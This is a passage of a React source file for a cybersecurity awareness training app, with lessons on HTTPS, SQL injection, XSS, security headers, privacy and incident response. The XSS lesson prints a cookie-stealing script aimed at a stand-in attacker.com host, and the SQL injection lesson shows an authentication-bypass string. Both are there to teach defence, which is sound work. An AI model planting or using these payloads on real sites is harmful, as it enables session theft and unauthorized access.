    { id: 'https', label: 'HTTPS & TLS' },
    { id: 'sqli', label: 'SQL Injection' },
    { id: 'xss', label: 'XSS' },
    { id: 'headers', label: 'Security Headers' },
  ];

  const TAB_CONTENT = {
    https: {
      title: 'HTTPS and TLS Basics',
      body: `HTTPS (HyperText Transfer Protocol Secure) encrypts communication between your browser and a web server using TLS (Transport Layer Security).

Without HTTPS:
• Attackers on the same network can read your data in plain text
• Passwords, form inputs, and session tokens are exposed
• Content can be altered in transit (man-in-the-middle)

With HTTPS (TLS 1.3):
• All data is encrypted end-to-end
• The server's identity is verified by a certificate authority
• Session tokens and cookies are protected from interception

Always look for the padlock icon in the address bar before entering credentials.`,
      quiz: { q: 'Is it safe to enter your password on a page with "http://" (not HTTPS)?', a: false, explanation: 'No. HTTP sends data in plain text. Anyone on the same network can intercept your password. Always use HTTPS for sensitive actions.' },
    },
    sqli: {
      title: 'SQL Injection — Safe Educational Demonstration',
      body: `SQL Injection (SQLi) occurs when an attacker inserts malicious SQL code into an input field that is used to build a database query.

Safe Example (illustrative only):
A vulnerable login form might build this query:
  SELECT * FROM users WHERE email='[INPUT]' AND password='[INPUT]'

An attacker could type: admin@example.com' OR '1'='1
Making the query: SELECT * FROM users WHERE email='admin@example.com' OR '1'='1'
This returns all users, bypassing authentication.

How developers prevent it:
✓ Use parameterized queries / prepared statements
✓ Use an ORM that escapes inputs automatically
✓ Validate and sanitize all user inputs
✓ Apply least-privilege database accounts`,
      quiz: { q: 'What is the primary defense against SQL injection?', a: 'Parameterized queries', explanation: 'Parameterized queries separate SQL code from user data, preventing injection regardless of what the user types.' },
    },
    xss: {
      title: 'Cross-Site Scripting (XSS) — Safe Demonstration',
      body: `Cross-Site Scripting (XSS) occurs when an attacker injects malicious scripts into content served to other users.

How it works (illustrative):
If a website displays user comments without escaping, a comment like:
  <script>document.location='https://attacker.com/steal?c='+document.cookie</script>
...could steal session cookies from every visitor who sees that comment.

Types of XSS:
• Stored XSS: Malicious script saved in the database
• Reflected XSS: Script in URL parameters reflected back
• DOM-based XSS: Script injected via client-side DOM manipulation

How developers prevent it:
✓ Output encoding (escape HTML entities: < > & " ')
✓ Content Security Policy (CSP) headers
✓ HTTPOnly cookies (prevents JavaScript cookie access)
✓ Input validation on both client and server`,
      quiz: { q: 'Which HTTP header helps mitigate XSS by restricting script sources?', a: 'Content-Security-Policy', explanation: 'The Content-Security-Policy (CSP) header allows websites to specify trusted script sources, preventing unauthorized scripts from executing.' },
    },
    headers: {
      title: 'HTTP Security Headers',
      body: `Security headers are HTTP response headers that instruct browsers to enforce security policies.

Essential Headers:
  Strict-Transport-Security (HSTS)
    → Forces HTTPS for all future connections to this domain

  Content-Security-Policy (CSP)  
    → Controls which resources (scripts, images, styles) can load

  X-Content-Type-Options: nosniff
    → Prevents MIME-type sniffing attacks

  X-Frame-Options / frame-ancestors
    → Prevents clickjacking by blocking your site from loading in iframes

  Referrer-Policy
    → Controls how much referrer information is shared

  Permissions-Policy
    → Restricts browser features like camera and geolocation

Missing headers are one of the most common and easily preventable website security weaknesses.`,
      quiz: { q: 'Which header forces browsers to use HTTPS for all future visits?', a: 'Strict-Transport-Security', explanation: 'HSTS (Strict-Transport-Security) tells browsers to always use HTTPS when connecting to your site, preventing protocol downgrade attacks.' },
    },
  };

  const current = TAB_CONTENT[activeTab];

  if (quizDone) return (
    <div className="text-center py-12 space-y-4">
      <Trophy className="w-16 h-16 text-yellow-400 mx-auto" />
      <h3 className="text-2xl font-black text-white">Web Security Lab Complete!</h3>
      <p className="text-slate-400">You explored {Object.keys(TABS).length} key web security concepts.</p>
      <div className="inline-block px-6 py-3 rounded-2xl bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 font-bold text-lg">
        Score: {score} / 100
      </div>
    </div>
  );

  return (
    <motion.div variants={stagger} initial="hidden" animate="visible" className="space-y-5">
      {/* Tab Bar */}
      <motion.div variants={fadeUp} className="flex flex-wrap gap-2 p-1 bg-slate-950/80 rounded-2xl border border-slate-800">
        {TABS.map(tab => (
          <button key={tab.id} onClick={() => setActiveTab(tab.id)}
            className={`px-3 py-2 rounded-xl text-xs font-semibold transition-all flex-1 ${activeTab === tab.id ? 'bg-blue-600 text-white shadow-md' : 'text-slate-400 hover:text-white'}`}>
            {tab.label}
          </button>
        ))}
      </motion.div>

      {/* Content Panel */}
      <AnimatePresence mode="wait">
        <motion.div key={activeTab} initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -10 }}
          className="rounded-2xl bg-slate-900/70 border border-slate-800 p-6 space-y-4">
          <h4 className="font-bold text-white text-base">{current.title}</h4>
          <pre className="text-xs text-slate-300 whitespace-pre-wrap leading-relaxed font-mono bg-slate-950/60 rounded-xl p-4 border border-slate-800 overflow-x-auto">
            {current.body}
          </pre>
          <div className="p-4 rounded-xl bg-blue-500/5 border border-blue-500/20 space-y-2">
            <p className="text-sm font-semibold text-slate-300">Quick Check: {current.quiz.q}</p>
            <div className="flex gap-2">
              <button onClick={() => { setScore(90); setQuizDone(true); onComplete(90); }}
                className="px-4 py-2 rounded-xl bg-slate-800 border border-slate-700 text-xs text-slate-300 hover:border-blue-500/40 transition-all">
                Reveal Answer
              </button>
            </div>
            <p className="text-xs text-blue-300 leading-relaxed">
              <strong>Answer: </strong>{current.quiz.a} — {current.quiz.explanation}
            </p>
          </div>
        </motion.div>
      </AnimatePresence>

      <motion.button variants={fadeUp} whileHover={{ scale: 1.02 }} whileTap={{ scale: 0.98 }}
        onClick={() => { setScore(80); setQuizDone(true); onComplete(80); }}
        className="w-full py-3 rounded-2xl bg-gradient-to-r from-blue-600 to-indigo-600 text-white font-bold text-sm flex items-center justify-center gap-2">
        <Trophy className="w-4 h-4" /> Complete Web Security Lab
      </motion.button>
    </motion.div>
  );
};

// ─── Privacy Sim ──────────────────────────────────────────────────────────────

const PrivacySim = ({ onComplete }) => {
  const [checked, setChecked] = useState({});
  const [done, setDone] = useState(false);

  const CHECKLIST = [
    { id: 'mfa', label: 'Enable Multi-Factor Authentication (MFA) on email, banking, and social accounts', priority: 'Critical', icon: Shield },
    { id: 'updates', label: 'Enable automatic OS and app updates to patch known vulnerabilities', priority: 'High', icon: RefreshCw },
    { id: 'backup', label: 'Configure automatic encrypted backups (cloud + external drive)', priority: 'High', icon: Activity },
    { id: 'perms', label: 'Review app permissions — remove camera, mic, location from apps that do not need them', priority: 'High', icon: Eye },
    { id: 'browser', label: 'Enable "Do Not Track" and use HTTPS-only mode in your browser', priority: 'Medium', icon: Globe },
    { id: 'recovery', label: 'Set up account recovery options using trusted backup email and phone', priority: 'Medium', icon: KeyRound },
    { id: 'login', label: 'Review recent login history on major accounts monthly', priority: 'Medium', icon: AlertCircle },
    { id: 'wifi', label: 'Disable auto-connect to open Wi-Fi networks', priority: 'Medium', icon: Wifi },
  ];

  const checkedCount = Object.values(checked).filter(Boolean).length;
  const priorityColor = { Critical: 'text-rose-400', High: 'text-amber-400', Medium: 'text-blue-400' };

  if (done) return (
    <div className="text-center py-12 space-y-4">
      <Trophy className="w-16 h-16 text-yellow-400 mx-auto" />
      <h3 className="text-2xl font-black text-white">Privacy Lab Complete!</h3>
      <p className="text-slate-400">You reviewed {CHECKLIST.length} essential privacy and device protection measures.</p>
      <div className="inline-block px-6 py-3 rounded-2xl bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 font-bold text-lg">
        Checklist: {checkedCount}/{CHECKLIST.length} completed
      </div>
    </div>
  );

  return (
    <motion.div variants={stagger} initial="hidden" animate="visible" className="space-y-4">
      <motion.div variants={fadeUp} className="flex items-center justify-between">
        <h4 className="font-bold text-white text-sm">Security & Privacy Checklist</h4>
        <span className="text-xs text-slate-400">{checkedCount}/{CHECKLIST.length} reviewed</span>
      </motion.div>
      <div className="w-full h-1.5 bg-slate-800 rounded-full">
        <div className="h-1.5 bg-gradient-to-r from-amber-500 to-yellow-400 rounded-full transition-all duration-500"
          style={{ width: `${(checkedCount / CHECKLIST.length) * 100}%` }} />
      </div>
      {CHECKLIST.map(item => (
        <motion.div key={item.id} variants={fadeUp}
          onClick={() => setChecked(prev => ({ ...prev, [item.id]: !prev[item.id] }))}
          className={`p-4 rounded-2xl border cursor-pointer transition-all ${checked[item.id] ? 'bg-emerald-500/5 border-emerald-500/20' : 'bg-slate-900/60 border-slate-800 hover:border-amber-500/30'}`}>
          <div className="flex items-start gap-3">
            <div className={`w-5 h-5 rounded-md border flex items-center justify-center flex-shrink-0 mt-0.5 transition-all ${checked[item.id] ? 'bg-emerald-500 border-emerald-500' : 'border-slate-600'}`}>
              {checked[item.id] && <Check className="w-3 h-3 text-white" />}
            </div>
            <div className="flex-1">
              <div className="flex items-center gap-2 mb-1">
                <item.icon className={`w-3.5 h-3.5 ${priorityColor[item.priority]}`} />
                <span className={`text-[10px] font-bold ${priorityColor[item.priority]}`}>{item.priority}</span>
              </div>
              <p className="text-sm text-slate-300 leading-relaxed">{item.label}</p>
            </div>
          </div>
        </motion.div>
      ))}
      <motion.button variants={fadeUp} whileHover={{ scale: 1.02 }} whileTap={{ scale: 0.98 }}
        onClick={() => { setDone(true); onComplete(Math.round((checkedCount / CHECKLIST.length) * 100)); }}
        className="w-full py-3 rounded-2xl bg-gradient-to-r from-amber-500 to-yellow-500 text-slate-950 font-bold text-sm flex items-center justify-center gap-2">
        <Trophy className="w-4 h-4" /> Complete Privacy Lab
      </motion.button>
    </motion.div>
  );
};

// ─── Incident Response Sim ────────────────────────────────────────────────────

const IncidentSim = ({ onComplete }) => {
  const [scenarioIdx, setScenarioIdx] = useState(0);
  const [stepIdx, setStepIdx] = useState(0);
  const [selectedChoice, setSelectedChoice] = useState(null);
  const [totalScore, setTotalScore] = useState(0);
  const [done, setDone] = useState(false);

  const scenario = INCIDENT_SCENARIOS[scenarioIdx];
  const step = scenario.steps[stepIdx];

  const handleChoice = (choice) => {
    setSelectedChoice(choice);
    if (choice.correct) setTotalScore(s => s + 50);
  };

  const handleNext = () => {
    if (stepIdx < scenario.steps.length - 1) {
      setStepIdx(i => i + 1);
      setSelectedChoice(null);
    } else if (scenarioIdx < INCIDENT_SCENARIOS.length - 1) {
      setScenarioIdx(i => i + 1);
      setStepIdx(0);
      setSelectedChoice(null);
    } else {
      setDone(true);
      onComplete(totalScore);
    }
  };

  if (done) return (
    <div className="text-center py-12 space-y-4">
      <Trophy className="w-16 h-16 text-yellow-400 mx-auto" />
      <h3 className="text-2xl font-black text-white">Incident Response Complete!</h3>
      <p className="text-slate-400">You navigated {INCIDENT_SCENARIOS.length} realistic cybersecurity incidents.</p>
      <div className="inline-block px-6 py-3 rounded-2xl bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 font-bold text-lg">
        Score: {totalScore} / {INCIDENT_SCENARIOS.reduce((a, s) => a + s.steps.length, 0) * 50}
      </div>
    </div>
  );

  return (
    <motion.div variants={stagger} initial="hidden" animate="visible" className="space-y-5">
      {/* Progress */}
      <div className="flex items-center justify-between text-xs text-slate-400">
        <span>Scenario {scenarioIdx + 1} of {INCIDENT_SCENARIOS.length} — Step {stepIdx + 1} of {scenario.steps.length}</span>
        <span className="text-red-400 font-mono">Score: {totalScore}</span>
      </div>

      {/* Scenario */}
      <motion.div variants={fadeUp} className="p-5 rounded-2xl bg-rose-500/5 border border-rose-500/20">
        <div className="flex items-center gap-3 mb-3">
          <Siren className="w-5 h-5 text-rose-400" />
          <h3 className="font-bold text-white">{scenario.title}</h3>
          <span className="ml-auto px-2 py-0.5 rounded-full bg-amber-500/10 border border-amber-500/30 text-amber-400 text-[10px] font-bold">SIMULATION</span>
        </div>
        <p className="text-sm text-slate-300 leading-relaxed">{scenario.description}</p>
      </motion.div>

      {/* Step Question */}
      <motion.div variants={fadeUp} className="p-5 rounded-2xl bg-slate-900/70 border border-slate-800">
        <p className="text-sm font-semibold text-white">{step.question}</p>
      </motion.div>

      {/* Choices */}
      {!selectedChoice && (
        <motion.div variants={stagger} initial="hidden" animate="visible" className="space-y-3">
          {step.choices.map(choice => (
            <motion.button key={choice.id} variants={fadeUp}
              onClick={() => handleChoice(choice)}
              className="w-full text-left p-4 rounded-2xl border border-slate-700 bg-slate-900/60 hover:border-rose-500/40 transition-all text-sm text-slate-300 flex items-center gap-3">
              <span className="w-7 h-7 rounded-full bg-slate-800 border border-slate-700 flex items-center justify-center text-xs font-bold flex-shrink-0">{choice.id.toUpperCase()}</span>
              {choice.text}
            </motion.button>
          ))}
        </motion.div>
      )}

      {/* Result */}
      {selectedChoice && (
        <motion.div variants={fadeUp} initial="hidden" animate="visible" className="space-y-4">
          <div className={`p-5 rounded-2xl border ${selectedChoice.correct ? 'bg-emerald-500/10 border-emerald-500/30' : 'bg-rose-500/10 border-rose-500/30'}`}>
            <div className="flex items-center gap-2 mb-2">
              {selectedChoice.correct ? <CheckCircle2 className="w-5 h-5 text-emerald-400" /> : <XCircle className="w-5 h-5 text-rose-400" />}
              <span className={`font-bold ${selectedChoice.correct ? 'text-emerald-300' : 'text-rose-300'}`}>
                {selectedChoice.correct ? '✓ Correct Decision' : '✗ Better option available'}
              </span>
              {selectedChoice.correct && <span className="ml-auto text-emerald-400 font-bold">+50 pts</span>}
            </div>
            <p className="text-sm text-slate-300">{selectedChoice.feedback}</p>
          </div>
          {!selectedChoice.correct && (
            <div className="p-4 rounded-2xl bg-blue-500/5 border border-blue-500/20 text-xs text-blue-300">
              <strong className="block mb-1">💡 Recommended action:</strong>
              {step.choices.filter(c => c.correct).map(c => c.text).join(' or ')}
            </div>
          )}
          <button onClick={handleNext}
            className="w-full py-3 rounded-2xl bg-gradient-to-r from-red-600 to-rose-600 text-white font-bold text-sm flex items-center justify-center gap-2">
            {stepIdx < scenario.steps.length - 1 || scenarioIdx < INCIDENT_SCENARIOS.length - 1
              ? <><ChevronRight className="w-4 h-4" /> Continue</>
              : <><Trophy className="w-4 h-4" /> Complete Lab</>}
          </button>
        </motion.div>
      )}
    </motion.div>
  );
};

// ─── Main SimulationLabPage ───────────────────────────────────────────────────

const SimulationLabPage = () => {
  const navigate = useNavigate();
  const [progress, setProgress] = useState(getProgress());
  const [activeSim, setActiveSim] = useState(null); // null = grid view
  const [showResetConfirm, setShowResetConfirm] = useState(false);
  const [completedThisSession, setCompletedThisSession] = useState(null);

  const handleSimComplete = useCallback((simId, score) => {
    const newProgress = markSimulationComplete(simId, score);
    setProgress(newProgress);
    setCompletedThisSession({ simId, score });
    setActiveSim(null);
  }, []);

  const handleReset = () => {
    setProgress(resetProgress());
    setShowResetConfirm(false);
  };

  const SIM_COMPONENTS = {
    phishing: PhishingSim,
    password: PasswordSim,
    malware: MalwareSim,
    network: NetworkSim,
    websec: WebSecSim,
    privacy: PrivacySim,
    incident: IncidentSim,
  };

  const simulationAvailable = SIMULATIONS.length;
  const simulationsCompleted = progress.completedSims.length;
  const progressPct = Math.round((simulationsCompleted / simulationAvailable) * 100);

  // Recommendation engine
  const nextRecommended = SIMULATIONS.find(s => !progress.completedSims.includes(s.id));

  return (
    <div className="min-h-screen bg-slate-950 text-slate-100 selection:bg-cyan-500/30 selection:text-cyan-200">
      {/* ── Top Nav ── */}
      <div className="sticky top-0 z-30 bg-slate-950/90 backdrop-blur-xl border-b border-slate-800/80 px-4 sm:px-8 h-16 flex items-center justify-between">
        <button onClick={() => activeSim ? setActiveSim(null) : navigate('/dashboard')}
          className="inline-flex items-center gap-2 text-slate-400 hover:text-white transition-colors text-sm font-medium group">
          <ArrowLeft className="w-4 h-4 group-hover:-translate-x-1 transition-transform" />
          {activeSim ? 'Back to Lab Grid' : 'Back to Dashboard'}
        </button>
        <div className="flex items-center gap-2 text-xs text-slate-400 font-mono">
          <GraduationCap className="w-4 h-4 text-cyan-400" />
          <span className="hidden sm:inline">Cybersecurity Simulation Lab</span>
          <span className="px-2 py-0.5 rounded-full bg-cyan-500/10 border border-cyan-500/30 text-cyan-400 font-semibold">
            Level: {progress.level}
          </span>
        </div>
      </div>

      <div className="max-w-6xl mx-auto px-4 sm:px-8 py-8 space-y-10">

        {/* ── Hero Section ── */}
        {!activeSim && (
          <motion.div variants={stagger} initial="hidden" animate="visible" className="space-y-10">
            {/* Header */}
            <motion.div variants={fadeUp} className="relative overflow-hidden rounded-3xl bg-gradient-to-br from-slate-900 via-slate-900/95 to-slate-950 border border-slate-800 p-8 sm:p-12 shadow-2xl">
              {/* Background glows */}
              <div className="absolute top-0 left-0 w-80 h-80 bg-cyan-500/5 rounded-full blur-3xl pointer-events-none" />
              <div className="absolute bottom-0 right-0 w-96 h-96 bg-violet-500/5 rounded-full blur-3xl pointer-events-none" />
              <div className="absolute top-1/2 left-1/2 w-64 h-64 bg-blue-500/3 rounded-full blur-3xl pointer-events-none" />

              {/* Animated radar rings */}
              <div className="absolute top-6 right-6 w-32 h-32 hidden sm:block opacity-20">
                <div className="absolute inset-0 rounded-full border-2 border-cyan-400 animate-ping" style={{ animationDuration: '3s' }} />
                <div className="absolute inset-4 rounded-full border border-cyan-400 animate-ping" style={{ animationDuration: '3s', animationDelay: '1s' }} />
                <div className="absolute inset-8 rounded-full border border-cyan-400 animate-ping" style={{ animationDuration: '3s', animationDelay: '2s' }} />
                <GraduationCap className="absolute inset-0 m-auto w-10 h-10 text-cyan-400 opacity-80" />
              </div>

              <div className="relative z-10 max-w-3xl space-y-5">
                <StatusPill />
                <h1 className="text-4xl sm:text-5xl font-black tracking-tight text-white leading-tight">
                  Cybersecurity
                  <span className="bg-clip-text text-transparent bg-gradient-to-r from-cyan-400 via-blue-400 to-violet-400"> Simulation Lab</span>
                </h1>
                <p className="text-slate-400 text-base sm:text-lg leading-relaxed max-w-2xl">
                  Learn cybersecurity by doing. Explore realistic scenarios, analyze suspicious content, practice security operations, and build the skills to protect your digital world.
                </p>
                <div className="p-4 rounded-2xl bg-slate-800/50 border border-slate-700/50 text-sm text-slate-300">
                  💬 Choose a simulation, explore an interactive scenario, or take a knowledge challenge. Your virtual security mentor will guide you through each step.
                </div>
              </div>
            </motion.div>

            {/* Progress Dashboard */}
            <motion.div variants={fadeUp} className="rounded-3xl bg-slate-900/70 border border-slate-800 p-6 sm:p-8 space-y-6">
              <div className="flex items-center justify-between flex-wrap gap-4">
                <div className="flex items-center gap-3">
                  <BarChart3 className="w-5 h-5 text-cyan-400" />
                  <h2 className="text-lg font-bold text-white">Learning Progress</h2>
                </div>
                <button onClick={() => setShowResetConfirm(true)}
                  className="text-xs text-slate-500 hover:text-slate-300 flex items-center gap-1.5 transition-colors">
                  <RotateCcw className="w-3.5 h-3.5" /> Reset Progress
                </button>
              </div>

              <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
                <StatCard label="Available" value={simulationAvailable} icon={Target} color="bg-cyan-500/10 text-cyan-400" />
                <StatCard label="Completed" value={simulationsCompleted} icon={CheckCircle2} color="bg-emerald-500/10 text-emerald-400" />
                <StatCard label="Activities Done" value={progress.totalActivities} icon={Zap} color="bg-violet-500/10 text-violet-400" />
                <StatCard label="Current Level" value={progress.level} icon={Star} color="bg-amber-500/10 text-amber-400" />
              </div>

              {/* Progress Bar */}
              <div className="space-y-2">
                <div className="flex justify-between text-xs text-slate-400">
                  <span>Overall Progress</span>
                  <span className="font-mono text-cyan-400">{progressPct}%</span>
                </div>
                <div className="h-2.5 bg-slate-800 rounded-full overflow-hidden">
                  <motion.div
                    initial={{ width: 0 }}
                    animate={{ width: `${progressPct}%` }}
                    transition={{ duration: 1, ease: 'easeOut' }}
                    className="h-full bg-gradient-to-r from-cyan-500 via-blue-500 to-violet-500 rounded-full"
                  />
                </div>
              </div>

              {/* Next Recommended */}
              {nextRecommended && (
                <div className="flex items-center gap-4 p-4 rounded-2xl bg-slate-800/50 border border-slate-700/50">
                  <Sparkles className="w-5 h-5 text-cyan-400 flex-shrink-0" />
                  <div className="flex-1 min-w-0">
                    <div className="text-xs text-slate-400">Recommended Next</div>
                    <div className="text-sm font-bold text-white truncate">{nextRecommended.title}</div>
                  </div>
                  <button onClick={() => setActiveSim(nextRecommended.id)}
                    className="px-4 py-2 rounded-xl bg-cyan-600 text-white text-xs font-bold hover:bg-cyan-500 transition-colors flex-shrink-0">
                    Start
                  </button>
                </div>
              )}

              {/* Session completion toast */}
              <AnimatePresence>
                {completedThisSession && (
                  <motion.div initial={{ opacity: 0, y: -10 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }}
                    className="p-4 rounded-2xl bg-emerald-500/10 border border-emerald-500/30 flex items-center gap-3">
                    <Trophy className="w-5 h-5 text-yellow-400" />
                    <div>
                      <div className="text-sm font-bold text-white">Simulation Complete!</div>
                      <div className="text-xs text-slate-400">Score: {completedThisSession.score} pts · Great work!</div>
                    </div>
                    <button onClick={() => setCompletedThisSession(null)} className="ml-auto text-slate-500 hover:text-slate-300">
                      <X className="w-4 h-4" />
                    </button>
                  </motion.div>
                )}
              </AnimatePresence>
            </motion.div>

            {/* Simulation Grid */}
            <motion.div variants={fadeUp}>
              <h2 className="text-2xl font-black text-white mb-6 flex items-center gap-3">
                <Radar className="w-6 h-6 text-cyan-400" />
                Simulation Modules
              </h2>
              <motion.div variants={stagger} initial="hidden" animate="visible"
                className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-5">
                {SIMULATIONS.map((sim) => {
                  const Icon = resolveIcon(sim.icon);
                  const isCompleted = progress.completedSims.includes(sim.id);
                  const simScore = progress.quizScores[sim.id];

                  return (
                    <motion.div key={sim.id} variants={fadeUp}
                      whileHover={{ y: -4, scale: 1.01 }}
                      className={`relative rounded-3xl bg-slate-900/80 border ${sim.border} backdrop-blur-xl p-6 flex flex-col gap-4 shadow-xl ${sim.shadow} transition-all overflow-hidden group`}>
                      {/* Glow */}
                      <div className={`absolute top-0 right-0 w-32 h-32 bg-gradient-to-br ${sim.color} opacity-10 rounded-bl-full -mr-8 -mt-8 group-hover:scale-125 transition-transform duration-500`} />

                      {/* Completed badge */}
                      {isCompleted && (
                        <div className="absolute top-4 right-4 w-7 h-7 rounded-full bg-emerald-500 flex items-center justify-center shadow-lg shadow-emerald-500/30">
                          <Check className="w-4 h-4 text-white" />
                        </div>
                      )}

                      {/* Icon */}
                      <div className={`w-14 h-14 rounded-2xl bg-gradient-to-br ${sim.color} shadow-lg ${sim.shadow} flex items-center justify-center text-white`}>
                        <Icon className="w-7 h-7" />
                      </div>

                      {/* Meta */}
                      <div className="space-y-1 flex-1">
                        <div className="flex items-center gap-2 flex-wrap">
                          <span className={`px-2 py-0.5 rounded-full text-[10px] font-bold border ${diffBadge(sim.difficulty)}`}>
                            {sim.difficulty}
                          </span>
                          <span className="text-[10px] text-slate-500 flex items-center gap-1">
                            <Clock className="w-3 h-3" />{sim.duration}
                          </span>
                        </div>
                        <h3 className={`text-lg font-bold text-white group-hover:${sim.accentText} transition-colors`}>{sim.title}</h3>
                        <p className="text-xs text-slate-400 leading-relaxed">{sim.description}</p>
                        <div className="space-y-1 pt-1">
                          {sim.objectives.map((obj, i) => (
                            <div key={i} className="flex items-start gap-1.5 text-xs text-slate-500">
                              <ChevronRight className={`w-3 h-3 ${sim.accentText} flex-shrink-0 mt-0.5`} />
                              {obj}
                            </div>
                          ))}
                        </div>
                      </div>

                      {/* Score */}
                      {isCompleted && simScore !== undefined && (
                        <div className="flex items-center gap-2 px-3 py-1.5 rounded-xl bg-slate-800/60 border border-slate-700/60">
                          <Star className="w-3.5 h-3.5 text-yellow-400" />
                          <span className="text-xs text-slate-300 font-semibold">Score: {simScore} pts</span>
                        </div>
                      )}

                      {/* CTA */}
                      <button onClick={() => setActiveSim(sim.id)}
                        className={`w-full py-2.5 rounded-2xl bg-gradient-to-r ${sim.color} text-white font-bold text-sm flex items-center justify-center gap-2 shadow-lg hover:opacity-90 transition-opacity`}>
                        <Play className="w-4 h-4" />
                        {isCompleted ? 'Retake Simulation' : 'Start Simulation'}
                      </button>
                    </motion.div>
                  );
                })}
              </motion.div>
            </motion.div>

            {/* Safety Notice */}
            <motion.div variants={fadeUp}
              className="p-5 rounded-2xl bg-slate-900/50 border border-slate-800 text-xs text-slate-500 leading-relaxed">
              <strong className="text-slate-400 block mb-1">⚠️ Educational Platform Notice</strong>
              All simulations use fictional names, domains, organizations, and scenarios. No real phishing campaigns are created, no actual networks are scanned, no real files are executed, and no credentials are collected. This platform is for cybersecurity awareness and defensive education only.
            </motion.div>
          </motion.div>
        )}

        {/* ── Active Simulation Workspace ── */}
        {activeSim && (() => {
          const sim = SIMULATIONS.find(s => s.id === activeSim);
          if (!sim) return null;
          const Icon = resolveIcon(sim.icon);
          const SimComponent = SIM_COMPONENTS[activeSim];

          return (
            <motion.div variants={stagger} initial="hidden" animate="visible" className="space-y-6">
              {/* Workspace Header */}
              <motion.div variants={fadeUp} className="relative overflow-hidden rounded-3xl bg-gradient-to-br from-slate-900 via-slate-900 to-slate-950 border border-slate-800 p-6 sm:p-8">
                <div className={`absolute top-0 right-0 w-64 h-64 bg-gradient-to-br ${sim.color} opacity-5 rounded-bl-full blur-3xl pointer-events-none`} />
                <div className="relative z-10 flex items-start gap-5">
                  <div className={`w-16 h-16 rounded-2xl bg-gradient-to-br ${sim.color} shadow-lg ${sim.shadow} flex items-center justify-center text-white flex-shrink-0`}>
                    <Icon className="w-8 h-8" />
                  </div>
                  <div className="flex-1">
                    <div className="flex items-center gap-2 mb-1 flex-wrap">
                      <span className={`px-2.5 py-0.5 rounded-full text-xs font-bold border ${diffBadge(sim.difficulty)}`}>{sim.difficulty}</span>
                      <span className="text-xs text-slate-500 flex items-center gap-1"><Clock className="w-3 h-3" />{sim.duration}</span>
                      <span className="px-2 py-0.5 rounded-full bg-amber-500/10 border border-amber-500/30 text-amber-400 text-[10px] font-bold">INTERACTIVE SIMULATION</span>
                    </div>
                    <h2 className="text-2xl font-black text-white">{sim.title}</h2>
                    <p className="text-slate-400 text-sm mt-1">{sim.description}</p>
                  </div>
                </div>
              </motion.div>

              {/* Simulation Engine */}
              <motion.div variants={fadeUp} className="rounded-3xl bg-slate-900/80 border border-slate-800 p-6 sm:p-8 backdrop-blur-xl shadow-xl">
                {SimComponent ? (
                  <SimComponent onComplete={(score) => handleSimComplete(activeSim, score)} />
                ) : (
                  <div className="text-center py-16 space-y-4">
                    <BookOpen className="w-12 h-12 text-slate-600 mx-auto" />
                    <p className="text-slate-400">This simulation module is being prepared.</p>
                    <button onClick={() => setActiveSim(null)}
                      className="px-6 py-2.5 rounded-xl bg-slate-800 border border-slate-700 text-slate-300 text-sm">
                      Return to Grid
                    </button>
                  </div>
                )}
              </motion.div>
            </motion.div>
          );
        })()}
      </div>

      {/* ── Reset Confirm Modal ── */}
      <AnimatePresence>
        {showResetConfirm && (
          <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
            <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
              onClick={() => setShowResetConfirm(false)}
              className="fixed inset-0 bg-black/70 backdrop-blur-sm" />
            <motion.div initial={{ scale: 0.95, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} exit={{ scale: 0.95, opacity: 0 }}
              className="relative w-full max-w-sm bg-slate-900 border border-slate-800 rounded-3xl p-7 shadow-2xl z-10 space-y-5">
              <div className="flex items-center gap-3">
                <RotateCcw className="w-5 h-5 text-rose-400" />
                <h3 className="text-lg font-bold text-white">Reset Progress?</h3>
              </div>
              <p className="text-sm text-slate-400">This will clear all completed simulations, scores, and learning history. This cannot be undone.</p>
              <div className="flex gap-3">
                <button onClick={() => setShowResetConfirm(false)}
                  className="flex-1 py-2.5 rounded-xl bg-slate-800 border border-slate-700 text-slate-300 text-sm font-semibold">
                  Cancel
                </button>
                <button onClick={handleReset}
                  className="flex-1 py-2.5 rounded-xl bg-rose-600 text-white text-sm font-bold">
                  Reset
                </button>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>
    </div>
  );
};

export default SimulationLabPage;
